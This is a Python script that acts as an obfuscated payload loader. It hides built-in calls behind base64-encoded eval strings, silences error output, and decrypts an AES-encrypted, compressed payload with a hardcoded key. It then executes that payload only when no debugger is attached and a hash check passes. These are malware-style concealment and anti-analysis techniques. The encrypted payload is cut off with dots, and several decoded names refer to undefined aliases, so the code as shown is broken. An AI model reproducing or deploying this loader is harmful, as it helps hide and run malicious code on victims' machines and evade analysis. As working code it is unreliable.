import os
import warnings
import sys
import zlib
import base64
import hashlib
import types
import builtins
from Crypto.Cipher import AES

warnings.filterwarnings("ignore")
sys.stderr = open(os.devnull, "w")

eval_func = getattr(builtins, 'eval')

base64_decode = eval_func(base64.b64decode('YmFzZTY0LmI2NGRlY29kZQo=').decode().strip())
types_FunctionType = eval_func(base64_decode('dC5GdW5jdGlvblR5cGUK').decode().strip())
bytes_fromhex = eval_func(base64_decode('Ynl0ZXMuZnJvbWhleAo=').decode().strip())
compile_func = eval_func(base64_decode('Y29tcGlsZQo=').decode().strip())
zlib_decompress = eval_func(base64_decode('emxpYi5kZWNvbXByZXNzCg==').decode().strip())
AES_new = eval_func(base64_decode('QUVTLm5ldwo=').decode().strip())
sys_exit = eval_func(base64_decode('cy5leGl0Cg==').decode().strip())
hashlib_sha512 = eval_func(base64_decode('aC5zaGE1MTIK').decode().strip())

padding_bytes = eval_func(base64_decode('YidceDAxXHgwMlx4MDNceDA0XHgwNVx4MDZceDA3XHgwOFx4MDlceDBhXHgwYlx4MGNceDBkXHgwZVx4MGZceDEwJwo=').decode().strip())
payload_globals = eval_func(base64_decode('eydfX25hbWVfXyc6J19fbWFpbl9fJywnX19idWlsdGluc19fJzpfX2J1aWx0aW5zX18sJ19fZmlsZV9fJzpzLmFyZ3ZbMF19Cg==').decode().strip())

encrypted_payload_b64 = 'eJwACED3v+bQJTFy75lf4c2UiQhUvdP7pO3TW+rDkzvoKdfk6tETWOIv.....'
encrypted_payload_b64 += 'd+KhYlWJonOoM862j5PT4LGmWmoxBg5h4vyYnYPXzYWUV4vu4Di7l2t/.......'

aes_key = bytes_fromhex('206cb441bba557a33bc558f2f64b01a8')
aes_iv = bytes_fromhex('eefbc5e1a7422ab858270202570bbd65')

decrypted_payload_code = AES_new(aes_key, AES.MODE_CBC, aes_iv).decrypt(
    zlib_decompress(base64_decode(encrypted_payload_b64))
).rstrip(padding_bytes).decode()

calculated_hash = hashlib_sha512(decrypted_payload_code.encode()).hexdigest()
expected_hash = '706ccbdf17baa0c3d0dc9f07c68ca7cd894a668c42bfbf8a9752d2b0259f5d7b7085dca3f5edc3f846ad5a2faa01588d101666c0823af1fd01ad42096b43a2fb'

def is_debugger_attached():
    return sys.gettrace() is not None
payload_code_object = compile_func(decrypted_payload_code, '<payload>', 'exec')
payload_function = types_FunctionType(payload_code_object, payload_globals)
if not is_debugger_attached() and calculated_hash == expected_hash:
    payload_function()
else:
    sys_exit()
